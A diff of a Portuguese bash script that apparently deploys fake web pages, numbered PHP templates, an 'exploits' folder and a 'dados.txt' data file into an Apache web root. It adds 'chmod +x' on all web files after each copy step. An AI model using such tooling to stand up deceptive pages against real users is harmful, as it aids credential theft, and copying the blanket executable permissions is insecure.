@@ -9,9 +9,10 @@ type_egs="API/models"  # Local dos modelos
 apache="/var/www/html/page-fake"  # Local do apache
 c="clear" # Limpar
 
+
 ## Criando pastas
 echo "[** criando nova pasta para o modelo **]"
-mkdir /var/www/html/page-fake
+mkdir $apache
 echo "[** Modelo criado com sucesso **]"
 $c
 
@@ -165,6 +166,7 @@ process_model_choice() {
             echo "[**Exploits Carregados com sucesso no apache**]"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
+            chmod +x $apache/* #Função para dar permissão para os arquivos
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
@@ -192,6 +194,7 @@ process_model_choice() {
             echo "[**Script carregado com sucesso no apache**]"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
+            chmod +x $apache/* #Função para dar permissão para os arquivos
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
@@ -207,6 +210,7 @@ process_model_choice() {
             echo "[**Iniciando Apache2**]"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
+            chmod +x $apache/* #Função para dar permissão para os arquivos
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
@@ -221,6 +225,7 @@ process_model_choice() {
             echo "[**Script carregado com sucesso no apache**]"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
+            chmod +x $apache/* #Função para dar permissão para os arquivos
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
@@ -234,6 +239,7 @@ process_model_choice() {
             cp  "$type_egs/6.php" "$apache"
             cp  "$type_egs/dados.txt"
             echo "[**Dados carregados com sucesso**]"
+            chmod +x $apache/* #Função para dar permissão para os arquivos
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
@@ -249,6 +255,7 @@ process_model_choice() {
             cp  "$type_egs/exploits/" "$apache"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
+            chmod +x $apache/* #Função para dar permissão para os arquivos
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
@@ -264,6 +271,7 @@ process_model_choice() {
             cp  "$type_egs/8.php" "$apache"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
+            chmod +x $apache/* #Função para dar permissão para os arquivos
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
@@ -279,6 +287,7 @@ process_model_choice() {
             cp  "$type_egs/9.php" "$apache"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
+            chmod +x $apache/* #Função para dar permissão para os arquivos
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
@@ -293,6 +302,7 @@ process_model_choice() {
             cp  "$type_egs/10.php" "$apache"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
+            chmod +x $apache/* #Função para dar permissão para os arquivos
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
@@ -307,6 +317,7 @@ process_model_choice() {
             cp  "$type_egs/11.php" "$apache"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
+            chmod +x $apache/* #Função para dar permissão para os arquivos
             cd $apache
             systemctl start apache2
             systemctl enable apache2.service
@@ -323,6 +334,7 @@ process_model_choice() {
             cp  "$type_egs/exploits/" "$apache"
             cp  "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
+            chmod +x $apache/* #Função para dar permissão para os arquivos
             systemctl start apache2
             systemctl enable apache2.service
             echo "[**Exploits Carregados com sucesso no apache**]"
@@ -336,6 +348,7 @@ process_model_choice() {
             cp  "$type_egs/13.php" "$apache"
             cp "$type_egs/dados.txt" "$apache"
             echo "[**Dados carregados com sucesso**]"
+            chmod +x $apache/* #Função para dar permissão para os arquivos
             systemctl start apache2
             systemctl enable apache2.service
             echo "[**Script carregado com sucesso no apache**]"
